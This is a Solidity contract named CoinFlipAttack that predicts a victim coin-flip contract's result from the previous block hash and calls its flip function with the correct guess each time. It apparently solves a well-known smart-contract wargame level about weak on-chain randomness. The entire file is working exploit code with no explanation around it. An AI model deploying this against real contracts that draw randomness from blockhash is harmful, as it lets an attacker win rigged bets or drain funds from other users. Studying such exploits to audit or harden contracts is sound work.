// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess(address victim) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool g = coinFlip == 1 ? true : false;

        bool result = ICoinFlip(victim).flip(g);

        require(result == true, "Guess failed");
    }
}
